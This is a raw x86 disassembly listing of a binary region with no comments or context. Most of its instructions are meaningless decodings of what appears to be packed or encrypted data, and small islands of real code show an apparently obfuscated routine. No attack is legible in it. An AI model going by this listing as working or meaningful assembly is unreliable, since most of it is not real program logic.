  4051f5:	xor    al,0x99
  4051f8:	outs   dx,DWORD PTR ds:[esi]
  4051f9:	rcr    ah,1
  4051fb:	and    al,al
  4051fd:	into   
  4051fe:	aas    
  4051ff:	xor    ecx,esi
  405201:	push   esp
  405202:	in     eax,0x68
  405204:	pop    ss
  405205:	in     eax,0x30
  405207:	pusha  
  405208:	jge    0x4051ff
  40520a:	pop    esi
  40520b:	imul   cl
  40520d:	push   cs
  40520e:	mov    dh,0xc3
  405210:	mov    edi,0x38f7a12
  405215:	inc    ebx
  405216:	mov    edx,0x3d6e3109
  40521b:	iret   
  40521c:	loop   0x405211
  40521e:	jo     0x40527e
  405220:	push   ss
  405221:	imul   edx,DWORD PTR [eax-0x9],0xc8864dd3
  405228:	push   ecx
  405229:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40522a:	jg     0x405239
  40522c:	mov    ebx,0x4f7302b8
  405231:	jae    0x4051da
  405233:	rcl    DWORD PTR [ebx-0x397cb592],1
  405239:	rcr    BYTE PTR [ebx-0x77],1
  40523c:	inc    ebp
  40523d:	or     al,0x8b
  40523f:	inc    ebp
  405240:	cld    
  405241:	mov    esi,DWORD PTR [ebp-0x8]
  405244:	xor    eax,edx
  405246:	xor    esi,edx
  405248:	add    eax,ecx
  40524a:	add    esi,ecx
  40524c:	imul   eax,esi
  40524f:	mov    esi,DWORD PTR [ebp+0xc]
  405252:	cmp    esi,eax
  405254:	mov    eax,DWORD PTR [ebp-0x4]
  405257:	je     0x405025
  40525d:	xor    eax,edx
  40525f:	add    eax,ecx
  405261:	mov    ecx,DWORD PTR [ebp+0xc]
  405264:	imul   eax,ecx
  405267:	add    eax,DWORD PTR [ebp+0x8]
  40526a:	mov    DWORD PTR [ebp+0xc],eax
  40526d:	mov    eax,DWORD PTR [ebp+0xc]
  405270:	pop    esi
  405271:	leave  
  405272:	ret    0x8
  405275:	push   ebp
  405276:	mov    ebp,esp
  405278:	push   ecx
  405279:	jmp    0x4055dc
  40527e:	sahf   
  40527f:	jb     0x40520d
  405281:	push   edx
  405282:	pop    esp
  405283:	jl     0x4052ed
  405285:	jb     0x405286
  405287:	ret    
  405288:	mov    ebx,0xe8972f39
  40528d:	aas    
  40528e:	pop    ebx
  40528f:	sub    bh,BYTE PTR [esi+0x7e]
  405292:	les    edi,FWORD PTR [ecx+0x7e]
  405295:	jle    0x4052a3
  405297:	ret    
  405298:	fsub   st,st(2)
  40529a:	mov    ebx,0xec152b10
  40529f:	imul   eax,DWORD PTR [edx+edx*8-0x1c942cb2],0x60c1fa0b
  4052aa:	sbb    al,0x94
  4052ac:	xlat   BYTE PTR ds:[ebx]
  4052ad:	sub    esp,DWORD PTR [esi+0x5f]
  4052b0:	loop   0x405253
  4052b2:	repz in al,0x0
  4052b5:	adc    eax,0x4dda966a
  4052ba:	bound  eax,QWORD PTR [edi]
  4052bc:	mov    esi,0xbe301ae8
  4052c1:	inc    esp
  4052c2:	mov    eax,0xcbc6bedd
  4052c7:	aad    0x93
  4052c9:	adc    BYTE PTR [ebx+edx*8],bh
  4052cc:	loopne 0x4052d7
  4052ce:	mov    ch,0x8b
  4052d0:	xchg   BYTE PTR [esi],ah
  4052d2:	sbb    al,0xc7
  4052d4:	push   es
  4052d5:	inc    BYTE PTR [edi-0x20]
  4052d8:	mov    ds,WORD PTR ds:0xe3b41951
  4052de:	pop    ds
  4052df:	or     eax,0x5157ed1d
  4052e4:	mov    dl,0x6b
  4052e6:	test   DWORD PTR [esi-0x54],ecx
  4052e9:	cwde   
  4052ea:	cdq    
  4052eb:	sub    DWORD PTR [edi+0x34884c11],ebx
  4052f1:	cld    
  4052f2:	fsubr  DWORD PTR [ebx+0x52]
  4052f5:	aam    0x6d
  4052f7:	out    0xa7,al
  4052f9:	cmp    eax,0x722a1638
  4052fe:	lea    ebp,[eax]
  405300:	sbb    BYTE PTR [edx+eax*8],bh
  405303:	shr    DWORD PTR [ecx-0x768dbdc6],1
  405309:	in     eax,dx
  40530a:	repz and eax,ebp
  40530d:	(bad)  
  40530e:	mov    DWORD PTR [esi+0x6c4cd432],esi
  405314:	sbb    BYTE PTR [ecx+edi*1+0x4],0x8c
  405319:	mov    es,WORD PTR [ebp+edx*1-0xf]
  40531d:	xor    cl,BYTE PTR [esi-0xa]
  405320:	mov    bh,BYTE PTR [ecx]
  405322:	imul   edx,ebx,0x324821cf
  405328:	test   cl,dl
  40532a:	lods   eax,DWORD PTR ds:[esi]
  40532b:	int    0x6a
  40532d:	xchg   esp,eax
  40532e:	push   0x7e
  405330:	enter  0xb506,0x9a
  405334:	fdivr  st,st(7)
  405336:	pop    es
  405337:	mov    esi,0x9fd39370
  40533c:	aaa    
  40533d:	mov    edx,0xc64c49cf
  405342:	out    0x8b,eax
  405344:	mov    ds:0xf8f0b43c,eax
  405349:	fdivr  st,st(7)
  40534b:	fdiv   DWORD PTR [edx+eiz*2+0x4c95dbfc]
  405352:	retf   
  405353:	dec    ecx
  405354:	add    al,0x1c
  405356:	or     eax,0x15b78f84
  40535b:	cmp    eax,0x74e4f838
  405360:	xor    eax,0x86d8b9d2
  405365:	sbb    DWORD PTR [ebx],ebp
  405367:	mov    ah,0x40
  405369:	mov    ?,WORD PTR [ecx]
  40536b:	out    0x69,eax
  40536d:	mov    bh,0xe2
  40536f:	int    0x46
  405371:	push   0x4b
  405373:	loope  0x405309
  405375:	add    edi,esp
  405377:	inc    ecx
  405378:	stc    
  405379:	(bad)  
  40537a:	(bad)
  40537e:	fist   DWORD PTR [edx+0x5856662a]
  405384:	xchg   DWORD PTR [esp+ebp*4],edx
  405387:	in     eax,0x5a
  405389:	sbb    DWORD PTR [edx+ebx*2-0x6beba4de],0xffffffc6
  405391:	dec    edx
  405392:	push   0xffffffc8
  405394:	pop    ss
  405395:	mov    ds:0xdb767425,eax
  40539a:	mov    bl,BYTE PTR [eax]
  40539c:	call   0x473f:0x3a517933
  4053a3:	sbb    al,0x58
  4053a5:	or     al,0x36
  4053a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053a8:	push   ebx
  4053a9:	push   eax
  4053aa:	xchg   ecx,eax
  4053ab:	push   cs
  4053ac:	mov    BYTE PTR gs:[ebx],ah
  4053af:	xor    esp,esi
  4053b1:	jae    0x40534d
  4053b3:	xor    al,0xac
  4053b5:	mov    ds:0x45044317,eax
  4053ba:	pop    ebx
  4053bb:	in     al,0xc0
  4053bd:	fmul   QWORD PTR [ebp+0x1e]
  4053c0:	aas    
  4053c1:	pushf  
  4053c2:	mov    ebp,edi
  4053c4:	pop    es
  4053c5:	xor    ebx,DWORD PTR [ecx-0x2de43799]
  4053cb:	inc    eax
  4053cc:	pop    ecx
  4053cd:	push   0x3888e821
  4053d2:	call   0xcd33:0xa10d1806
  4053d9:	sub    ecx,DWORD PTR [eax-0x53]
  4053dc:	mov    al,0xf5
  4053de:	pop    es
  4053df:	sub    BYTE PTR [ebp+0x26fa5bd4],0x8a
  4053e6:	pop    es
  4053e7:	and    al,0x3e
  4053e9:	mov    BYTE PTR [edx+edx*4],ah
  4053ec:	cmp    ebx,esp
  4053ee:	push   0x477dd592
  4053f3:	cmp    ebp,edi
  4053f5:	inc    eax
  4053f6:	add    dh,BYTE PTR [ebx+0x33]
  4053f9:	ins    DWORD PTR es:[edi],dx
  4053fa:	xchg   ebp,eax
  4053fb:	outs   dx,DWORD PTR ds:[esi]
  4053fc:	or     al,0x95
  4053fe:	dec    eax
  4053ff:	pop    ss
  405400:	xchg   BYTE PTR [edx],dh
  405402:	loope  0x405433
  405404:	sub    al,0x65
  405406:	(bad)  
  405407:	imul   esp,edi,0x12
  40540a:	cmp    dh,bl
  40540c:	xor    al,cl
  40540e:	scas   eax,DWORD PTR es:[edi]
  40540f:	mov    ebp,0x67874f4
  405414:	xchg   ch,al
  405416:	and    ah,dl
  405418:	adc    ebx,DWORD PTR [eax-0x1e]
  40541b:	sub    eax,0x41713ff4
  405420:	add    BYTE PTR [esi+0x2f5a1a5c],dl
  405426:	inc    esi
  405427:	shr    ebx,0xc4
  40542a:	gs cdq 
  40542c:	inc    esi
  40542d:	sbb    al,BYTE PTR [ebx+0x15]
  405430:	popf   
  405431:	les    edi,FWORD PTR [eax+0x62]
  405434:	test   al,0xd6
  405436:	pop    ds
  405437:	dec    esp
  405438:	cmp    ebx,ecx
  40543a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40543b:	sti    
  40543c:	fisubr DWORD PTR [ecx+0x7a7dc89c]
  405442:	or     edi,DWORD PTR [edi+0x48]
  405445:	or     DWORD PTR [ebx+eax*4],0x52dff90e
  40544c:	mov    WORD PTR [eax+0xef818bf],es
  405452:	mov    edx,0x99b130d7
  405457:	add    bh,BYTE PTR [ebp+0x2002bd8b]
  40545d:	pop    edi
  40545e:	jmp    0x9858:0xb14c1f52
  405465:	xchg   esp,eax
  405466:	js     0x40545f
  405468:	mul    DWORD PTR [edi]
  40546a:	jns    0x4054d2
  40546c:	inc    edx
  40546d:	mov    ds:0xe9b784c8,al
  405472:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405473:	(bad)  
  405475:	in     al,0xbe
  405477:	mov    ecx,0x782222b7
  40547c:	push   edx
  40547d:	mov    ds:0xe390dfa,eax
  405482:	out    0xfa,eax
  405484:	mov    ah,0xb3
  405486:	push   esi
  405487:	mov    ecx,0xb9b939c
  40548c:	into   
  40548d:	bound  ebx,QWORD PTR [ebp-0x16]
  405490:	mov    esp,0xf604e885
  405495:	and    al,0x7d
  405497:	dec    esp
  405498:	lock cmp edx,DWORD PTR [edx+0x22f20478]
  40549f:	dec    eax
  4054a0:	mov    eax,ds:0x60c47ea9
  4054a5:	dec    ebx
  4054a6:	in     al,0x2b
  4054a8:	js     0x4054d1
  4054aa:	inc    ebx
  4054ab:	jp     0x405524
  4054ad:	pop    esi
  4054ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054af:	push   eax
  4054b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054b1:	cmp    al,0x66
  4054b3:	sbb    eax,0xe4e43431
  4054b8:	test   al,0x8d
  4054ba:	(bad)  
  4054bb:	mov    eax,0x3ed31a00
  4054c0:	dec    DWORD PTR [edx]
  4054c2:	mov    ch,0x44
  4054c4:	mov    esp,0x2fa28dd5
  4054c9:	fiadd  WORD PTR [esi+0x4cf0710d]
  4054cf:	jge    0x4054c5
  4054d1:	aad    0x14
  4054d3:	add    cl,BYTE PTR [esi-0x4f]
  4054d6:	inc    ebp
  4054d7:	les    ecx,FWORD PTR [ecx+0x4d10c8fa]
  4054dd:	pop    ebp
  4054de:	inc    eax
  4054df:	daa    
  4054e0:	inc    eax
  4054e1:	(bad)  
  4054e3:	loop   0x4054b6
  4054e5:	rcl    DWORD PTR [esi],cl
  4054e7:	ror    BYTE PTR [ebp+0xb8c7a8d],1
  4054ed:	lds    ecx,FWORD PTR [ecx+0x12]
  4054f0:	imul   esp,DWORD PTR [ecx+0x2b5757c1],0xbd7fc0c3
  4054fa:	or     DWORD PTR [ecx-0x626f683],0x3846d501
  405504:	sbb    esi,ebp
  405506:	jl     0x405547
  405508:	and    BYTE PTR [esi],dh
  40550a:	dec    ebx
  40550b:	pop    esp
  40550c:	xor    al,0xd7
  40550e:	into   
  40550f:	mov    al,0x9b
  405511:	inc    esi
  405512:	add    eax,0x54342f5c
  405517:	xchg   esi,edi
  405519:	mov    bl,0xba
  40551b:	add    ebp,0xa2387df6
  405521:	shl    DWORD PTR [edi+0x8b0ef86],cl
  405527:	add    DWORD PTR [esi-0x1e],edi
  40552a:	add    DWORD PTR [ebx-0x59526e58],edx
  405530:	shl    DWORD PTR [ecx+eiz*4+0x69bfbd4f],0x44
  405538:	sub    al,bl
  40553a:	push   0x8d026112
  40553f:	cmp    BYTE PTR [ebx+0x72],cl
  405542:	push   es
  405543:	and    ah,BYTE PTR [ecx-0x24]
  405546:	ja     0x40553b
  405548:	push   es
  405549:	test   BYTE PTR [eax-0xf35060a],bl
  40554f:	addr16 xchg esi,eax
  405551:	xchg   ebp,eax
  405552:	xor    al,BYTE PTR [edi]
  405554:	aad    0xd4
  405556:	xchg   edx,eax
  405557:	out    dx,al
  405558:	inc    ebp
  405559:	stos   DWORD PTR es:[edi],eax
  40555a:	or     al,0x40
  40555c:	xor    DWORD PTR [edi],edx
  40555e:	daa    
  40555f:	sbb    dl,BYTE PTR [esi+0x40]
  405562:	icebp  
  405563:	dec    edx
  405564:	imul   esi,DWORD PTR [ebx],0xffffff92
  405567:	add    bl,dl
  405569:	in     al,dx
  40556a:	mov    ebp,db4
  40556d:	mov    edi,DWORD PTR [edx+edx*4+0x1cc40d48]
  405574:	outs   dx,DWORD PTR ds:[esi]
  405575:	out    dx,al
  405576:	rol    DWORD PTR [ebp+0x20],cl
  405579:	clc    
  40557a:	pop    ecx
  40557b:	add    ch,BYTE PTR [edi]
  40557d:	fwait
  40557e:	loop   0x4055e7
  405580:	mov    ebp,0x4b279c9b
  405585:	sbb    ebx,DWORD PTR [esi]
  405587:	test   BYTE PTR [ebp-0x2ab0b3f0],0x66
  40558e:	inc    eax
  40558f:	repz mul eax
  405592:	xchg   ebp,eax
  405593:	aaa    
  405594:	mov    bl,BYTE PTR [edx+0x31]
  405597:	in     al,0xb7
  405599:	test   eax,0xcb4ad5bd
  40559e:	fcom   QWORD PTR [ecx+0x113d2958]
  4055a4:	dec    esp
  4055a5:	popf   
  4055a6:	adc    dl,BYTE PTR [ecx+0x4d104554]
  4055ac:	xchg   edi,eax
  4055ad:	pop    ebx
  4055ae:	pusha  
  4055af:	lahf   
  4055b0:	aad    0x9c
  4055b2:	pop    ss
  4055b3:	cmp    BYTE PTR [esi+0x46],dl
  4055b6:	xchg   ecx,eax
  4055b7:	ins    DWORD PTR es:[edi],dx
  4055b8:	xor    BYTE PTR [eax],cl
  4055ba:	outs   dx,DWORD PTR ds:[esi]
  4055bb:	fst    st(3)
  4055bd:	and    al,0x78
  4055bf:	bound  esi,QWORD PTR [ecx]
  4055c1:	jp     0x405616
  4055c3:	scas   eax,DWORD PTR es:[edi]
  4055c4:	cli    
  4055c5:	test   al,0xf
  4055c7:	in     al,0x86
  4055c9:	sub    BYTE PTR [edx-0x68],dh
  4055cc:	mov    eax,ds:0xc0a298bd
  4055d1:	repnz icebp 
  4055d3:	push   ebp
  4055d4:	test   BYTE PTR [ecx+0x5b],dh
  4055d7:	int    0x10
  4055d9:	push   ss
  4055da:	sub    al,0x1e
  4055dc:	push   ecx
  4055dd:	mov    eax,0x5a3fc9f
  4055e2:	mov    DWORD PTR [ebp-0x4],eax
  4055e5:	mov    DWORD PTR ds:0x434673,0x3619
  4055ef:	mov    ecx,DWORD PTR [ebp-0x4]
  4055f2:	jmp    0x405955
  4055f7:	xchg   esi,eax
  4055f8:	jb     0x405627
  4055fa:	jg     0x4055e9
  4055fc:	dec    ecx
  4055fd:	mov    esp,0x8b1aac73
  405602:	fdivr  QWORD PTR cs:[ebp+0x3621fb55]
  405609:	jle    0x405689
  40560b:	les    edi,FWORD PTR [ecx+0x7e]
  40560e:	jle    0x405619
  405610:	iret   
  405611:	cs pusha 
  405613:	rcl    ecx,1
  405615:	out    dx,al
  405616:	fdivr  QWORD PTR [esi+0x34742f3b]
  40561c:	das    
  40561d:	out    dx,al
  40561e:	xor    dl,BYTE PTR [esi+0x2b]
  405621:	iret   
  405622:	mov    edi,0xe32e8dc4
  405627:	sub    al,0xfd
  405629:	sbb    ch,BYTE PTR [edi]
  40562b:	mov    esi,0x2a5160c9
  405630:	ins    BYTE PTR es:[edi],dx
  405631:	arpl   WORD PTR [ebx],bp
  405633:	mov    ah,0xd5
  405635:	inc    edx
  405636:	and    esi,DWORD PTR [edi]
  405638:	jb     0x4056b7
  40563a:	jecxz  0x405629
  40563c:	call   0xbea0:0x5492282a
  405643:	dec    ebp
  405644:	or     ebx,DWORD PTR ds:0xed59fe61
  40564a:	fwait
  40564b:	pop    edx
  40564c:	pop    es
  40564d:	pop    edx
  40564e:	test   al,0x63
  405650:	add    esi,DWORD PTR [ebx]
  405652:	cwde   
  405653:	nop
  405654:	leave  
  405655:	cmp    al,0xf7
  405657:	xchg   ebp,eax
  405658:	or     BYTE PTR [edx+ecx*2],al
  40565b:	sub    edx,DWORD PTR [edi+0x29fc2f98]
  405661:	daa    
  405662:	inc    di
  405664:	test   BYTE PTR [ebp+0x11d200d1],dl
  40566a:	xor    dh,dl
  40566c:	and    BYTE PTR [eax+0x749f463d],ah
  405672:	dec    ecx
  405673:	xabort 0x4
  405676:	pushf  
  405677:	es gs ins DWORD PTR es:[edi],dx
  40567a:	loop   0x4056cb
  40567c:	std    
  40567d:	imul   edx,DWORD PTR [ebp+0x7e01878c],0x41
  405684:	mov    WORD PTR [ebp-0x26321617],ds
  40568a:	(bad)  
  40568b:	mov    edi,DWORD PTR [ecx-0x26d9c315]
  405691:	sub    al,0x12
  405693:	das    
  405694:	outs   dx,DWORD PTR ds:[esi]
  405695:	inc    ebp
  405696:	(bad)
  40569a:	cwde   
  40569b:	sar    DWORD PTR [ecx],cl
  40569d:	lods   al,BYTE PTR ds:[esi]
  40569e:	std    
  40569f:	mov    ebp,0x635456d
  4056a4:	sub    DWORD PTR ds:0x4386f3a,0x35
  4056ab:	xor    eax,0x7a689789
  4056b0:	shl    BYTE PTR [edx+edi*2+0x4],cl
  4056b4:	adc    DWORD PTR [edi],0xf67ea38d
  4056ba:	jo     0x405729
  4056bc:	mov    ch,0x40
  4056be:	fisttp WORD PTR [esi+0x5e]
  4056c1:	into   
  4056c2:	pop    edi
  4056c3:	in     al,dx
  4056c4:	mov    esi,0x500c4a4c
  4056c9:	mov    edx,0xf32e69ab
  4056ce:	bound  eax,QWORD PTR ds:0x78f9436d
  4056d4:	(bad)  
  4056d5:	lods   al,BYTE PTR ds:[esi]
  4056d6:	cmp    al,0x2c
  4056d8:	ret    
  4056d9:	cli    
  4056da:	and    BYTE PTR [edi-0xfaa3fff],dl
  4056e0:	inc    edx
  4056e1:	push   ecx
  4056e2:	js     0x4056aa
  4056e4:	clc    
  4056e5:	call   0xa68d3400
  4056ea:	mov    ah,0x69
  4056ec:	mov    edi,0xe57314a8
  4056f1:	call   0x3eb103fc
  4056f6:	pushf  
  4056f7:	add    edx,0x40
  4056fa:	jmp    0xb623796b
  4056ff:	jge    0x40569b
  405701:	int    0xbd
  405703:	aaa    
  405704:	adc    al,BYTE PTR [eax+0x5a7e0648]
  40570a:	lock push ecx
  40570c:	jo     0x405737
  40570e:	jge    0x405758
  405710:	jbe    0x4056c1
  405712:	xlat   BYTE PTR ds:[ebx]
  405713:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405714:	sbb    BYTE PTR [ebx-0x3b0cb358],ah
  40571a:	bound  edx,QWORD PTR [edi+0x3117a290]
  405720:	push   eax
  405721:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405722:	jle    0x40572b
  405724:	daa    
  405725:	call   0xb213a9ab
  40572a:	mov    eax,ds:0x49427560
  40572f:	(bad)  
  405730:	push   esi
  405731:	push   eax
  405732:	imul   edx,DWORD PTR [ecx],0x19
  405735:	mov    al,ds:0xde2edea6
  40573a:	xor    eax,ebx
  40573c:	popf   
  40573d:	out    dx,al
  40573e:	or     dh,BYTE PTR [esi+0x2a]
  405741:	push   ebx
  405742:	in     eax,dx
  405743:	sub    al,0xa6
  405745:	shr    DWORD PTR [ebx+ebp*2-0x2a],1
  405749:	ficomp DWORD PTR [esi+ebx*8+0x2ca8e8a9]
  405750:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405751:	data16 sub al,0x2
  405754:	cdq    
  405755:	mov    ebx,DWORD PTR [esi-0x48110409]
  40575b:	arpl   WORD PTR [esi],di
  40575d:	mov    edi,0x87e410a7
  405762:	and    eax,0xf69f6941
  405767:	into   
  405768:	addr16 test al,0x93
  40576b:	cmc    
  40576c:	int    0x84
  40576e:	ins    BYTE PTR es:[edi],dx
  40576f:	add    al,0x19
  405771:	(bad)  
  405772:	cmp    eax,0xbe603b88
  405777:	scas   eax,DWORD PTR es:[edi]
  405778:	sub    al,0x9e
  40577a:	add    edx,DWORD PTR [ebx]
  40577c:	aaa    
  40577d:	sbb    DWORD PTR [esi+edi*8-0x1110880],ebx
  405784:	in     al,0x76
  405786:	inc    edi
  405787:	out    dx,al
  405788:	push   0x936bad53
  40578d:	sub    BYTE PTR [ebp+0x931a4e2],bh
  405793:	loope  0x405733
  405795:	pushf  
  405796:	int    0x7c
  405798:	out    0x44,al
  40579a:	scas   al,BYTE PTR es:[edi]
  40579b:	pusha  
  40579c:	add    DWORD PTR cs:[ecx],ebp
  40579f:	mov    dh,0x14
  4057a1:	lock mov ch,0x64
  4057a4:	jecxz  0x405817
  4057a6:	inc    edx
  4057a7:	pop    ss
  4057a8:	inc    eax
  4057a9:	ja     0x40579f
  4057ab:	jle    0x4057f7
  4057ad:	pop    esp
  4057ae:	je     0x4057c7
  4057b0:	cmp    DWORD PTR [ebx],0x776e95a0
  4057b6:	in     al,0x5a
  4057b8:	cmp    al,0xe4
  4057ba:	sbb    DWORD PTR [eax],ebp
  4057bc:	or     WORD PTR [ebp+ecx*2+0x1e6e8844],di
  4057c4:	pop    edi
  4057c5:	push   es
  4057c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057c7:	mov    eax,0x3c09d968
  4057cc:	adc    eax,0x789b19fc
  4057d1:	adc    ebp,DWORD PTR [esi]
  4057d3:	push   eax
  4057d4:	lahf   
  4057d5:	dec    ebp
  4057d6:	js     0x405833
  4057d8:	jne    0x405851
  4057da:	add    DWORD PTR [ebx-0x407e844a],eax
  4057e0:	mov    esi,0x3a7cc705
  4057e5:	into   
  4057e6:	leave  
  4057e7:	scas   al,BYTE PTR es:[edi]
  4057e8:	xchg   edi,eax
  4057e9:	jl     0x4057b8
  4057eb:	pop    esp
  4057ec:	pushf  
  4057ed:	leave  
  4057ee:	add    eax,0xbd95885d
  4057f3:	sbb    ebx,DWORD PTR [esi+0x2e]
  4057f6:	pushf  
  4057f7:	stc    
  4057f8:	shl    BYTE PTR [ebx],1
  4057fa:	jmp    0x40586c
  4057fc:	jne    0x4057ea
  4057fe:	inc    edi
  4057ff:	fidivr WORD PTR [edi]
  405801:	icebp  
  405802:	add    DWORD PTR [edx-0x3e],ecx
  405805:	push   cs
  405806:	xchg   edi,eax
  405807:	jmp    0x64ed:0x2e4447c3
  40580e:	mov    al,0xae
  405810:	xchg   ecx,eax
  405811:	(bad)  
  405812:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405813:	xor    bh,BYTE PTR [eax+eiz*4+0x5d492c57]
  40581a:	hlt    
  40581b:	mov    edx,0xcee6f16d
  405820:	(bad)  
  405822:	push   0x6e765db6
  405827:	xlat   BYTE PTR ds:[ebx]
  405828:	xchg   ebx,eax
  405829:	fs aas 
  40582b:	adc    al,0x87
  40582d:	mov    dh,0x0
  40582f:	cmp    eax,0x1d886267
  405834:	adc    DWORD PTR [eax+esi*8-0x67677c9c],0x4a3f129f
  40583f:	adc    DWORD PTR [esi],ecx
  405841:	push   cs
  405842:	out    dx,eax
  405843:	fsubr  QWORD PTR ds:0x5da9f146
  405849:	xchg   ecx,eax
  40584a:	out    0x7d,al
  40584c:	xchg   ecx,eax
  40584d:	push   esi
  40584e:	stos   BYTE PTR es:[edi],al
  40584f:	sti    
  405850:	icebp  
  405851:	test   DWORD PTR [edi+eiz*2],ebp
  405854:	je     0x4058c7
  405856:	jae    0x405844
  405858:	sbb    DWORD PTR ds:0x133632c9,esi
  40585e:	pop    ds
  40585f:	adc    al,0x23
  405861:	cdq    
  405862:	inc    ebx
  405863:	mov    dl,0x46
  405865:	sbb    edx,DWORD PTR [edi+0x47]
  405868:	pop    es
  405869:	sub    eax,0xa3f3cd04
  40586e:	sbb    bl,dl
  405870:	inc    ebp
  405871:	stos   BYTE PTR es:[edi],al
  405872:	add    BYTE PTR [edi],bh
  405874:	je     0x4058c4
  405876:	fmul   DWORD PTR [ebx-0x381c3f00]
  40587c:	or     eax,0xa61190a7
  405881:	and    DWORD PTR [ebp+0x64],0xffffff9a
  405885:	adc    DWORD PTR [ebx+0x69764422],0x3b
  40588c:	or     al,0x2b
  40588e:	pop    edi
  40588f:	js     0x40587c
  405891:	add    eax,0xe7124a46
  405896:	retf   0xa7b7
  405899:	std    
  40589a:	push   edi
  40589b:	shl    ebp,cl
  40589d:	jo     0x405856
  40589f:	shl    esp,cl
  4058a1:	push   esi
  4058a2:	add    DWORD PTR gs:[ebx+0x57c00e42],ebx
  4058a9:	mov    al,ds:0xad49e248
  4058ae:	stos   BYTE PTR es:[edi],al
  4058af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058b0:	inc    esp
  4058b1:	pop    ebp
  4058b2:	ss icebp 
  4058b4:	and    eax,esp
  4058b6:	jns    0x4058c9
  4058b8:	es repnz test al,0xa0
  4058bc:	mov    esp,0x58279d99
  4058c1:	in     al,0x88
  4058c3:	inc    eax
  4058c4:	jb     0x4058a7
  4058c6:	popf   
  4058c7:	jg     0x40592d
  4058c9:	ja     0x405900
  4058cb:	pop    ebx
  4058cc:	lods   eax,DWORD PTR ds:[esi]
  4058cd:	aad    0xd8
  4058cf:	outs   dx,BYTE PTR ds:[esi]
  4058d0:	push   ds
  4058d1:	call   0x2f774b3f
  4058d6:	sub    esp,DWORD PTR [edx+0x53]
  4058d9:	cmp    ebx,edx
  4058db:	jmp    0xee97:0x3baa8c87
  4058e2:	pop    eax
  4058e3:	stos   DWORD PTR es:[edi],eax
  4058e4:	(bad)  
  4058e5:	popf   
  4058e6:	in     al,0xdd
  4058e8:	mov    eax,DWORD PTR [edx]
  4058ea:	jne    0x4058bc
  4058ec:	arpl   WORD PTR [ebp-0x7b6282ee],cx
  4058f2:	mov    edx,0xbc12c3f0
  4058f7:	jns    0x405925
  4058f9:	inc    esi
  4058fa:	btr    DWORD PTR [ecx],edi
  4058fd:	xchg   esp,eax
  4058fe:	add    eax,0xd0e94e4c
  405903:	jge    0x4058c8
  405905:	push   0xfffffffa
  405907:	and    al,0x92
  405909:	sbb    BYTE PTR [esi-0x6b9c3d30],bh
  40590f:	aad    0xd0
  405911:	sbb    eax,0x4ae00306
  405916:	mov    al,0xd4
  405918:	xchg   edi,eax
  405919:	cmp    edi,DWORD PTR [ecx-0x68b4cbb9]
  40591f:	repnz add al,0xbd
  405922:	mov    bh,0x1b
  405924:	icebp  
  405925:	cdq    
  405926:	sub    ebp,ebx
  405928:	jl     0x4058c3
  40592a:	mov    fs,WORD PTR [eax+0x3b]
  40592d:	es clc 
  40592f:	pushf  
  405930:	push   esp
  405931:	sbb    BYTE PTR [ebp+0x1fb291cc],0x94
  405938:	jle    0x4058cb
  40593a:	mov    bh,0xbf
  40593c:	mov    ebx,0xf4aac32c
  405941:	pop    edx
  405942:	mov    ds:0x3d18da22,al
  405947:	sub    DWORD PTR [ecx+ecx*1],esp
  40594a:	scas   eax,DWORD PTR es:[edi]
  40594b:	push   esp
  40594c:	mov    eax,DWORD PTR [ebp-0x51]
  40594f:	mov    cl,0xf
  405951:	jae    0x4059bb
  405953:	(bad)  
  405954:	mov    ebx,0x39f845c7
  405959:	dec    edi
  40595a:	add    BYTE PTR [eax],al
  40595c:	mov    DWORD PTR ds:0x434753,0x224a
  405966:	jmp    0x405cc9
  40596b:	mov    edx,0x71b8a1ab
  405970:	pop    esp
  405971:	arpl   WORD PTR [ebp-0x4d872e44],si
  405977:	mov    al,0xdf
  405979:	sbb    al,0xb6
  40597b:	out    dx,eax
  40597c:	xor    DWORD PTR [esi+0x7e],edi
  40597f:	les    edi,FWORD PTR [ecx+0x7e]
  405982:	jle    0x40593e
  405984:	pop    edx
  405985:	jbe    0x405953
  405987:	cmp    edx,edx
  405989:	jnp    0x405928
  40598b:	jno    0x40597d
  40598d:	add    DWORD PTR [edi],edx
  40598f:	xchg   edx,eax
  405990:	jno    0x405991
  405992:	stos   DWORD PTR es:[edi],eax
  405993:	fsub   DWORD PTR [esi+ebp*8-0x72]
  405997:	test   BYTE PTR [edi+0x20],al
  40599a:	loopne 0x40599d
  40599c:	andps  xmm4,XMMWORD PTR [ecx+0x2e]
  4059a0:	iret   
  4059a1:	pushf  
  4059a2:	mov    ecx,0x4569b876
  4059a7:	and    DWORD PTR [ebx+ecx*4-0x3f56475a],0x47
  4059af:	push   cs
  4059b0:	aas    
  4059b1:	push   ebp
  4059b2:	sti    
  4059b3:	adc    DWORD PTR [ecx+0x4ceab55e],ebx
  4059b9:	(bad)  
  4059ba:	jle    0x405a25
  4059bc:	loope  0x40596b
  4059be:	mov    dl,0xc
  4059c0:	xchg   DWORD PTR [edi+eiz*4],eax
  4059c3:	jae    0x405986
  4059c5:	adc    al,ch
  4059c7:	and    DWORD PTR [eax-0x6042bf7],eax
  4059cd:	leave  
  4059ce:	push   esi
  4059cf:	sub    ecx,DWORD PTR ds:0xbc9571a9
  4059d5:	fwait
  4059d6:	sbb    ebx,ecx
  4059d8:	and    bh,dh
  4059da:	sbb    dl,BYTE PTR [esi]
  4059dc:	inc    esi
  4059dd:	retf   
  4059de:	xchg   BYTE PTR [ecx+0x39],ch
  4059e1:	scas   al,BYTE PTR es:[edi]
  4059e2:	xor    al,0x5f
  4059e4:	xchg   edx,eax
  4059e5:	mov    DWORD PTR [eax+esi*2-0x51],esi
  4059e9:	ds mov esi,0x2b311e0d
  4059ef:	adc    bh,bl
  4059f1:	or     al,0x52
  4059f3:	inc    edi
  4059f4:	dec    esp
  4059f5:	repz pop ebp
  4059f7:	repnz std 
  4059f9:	cmp    ah,dl
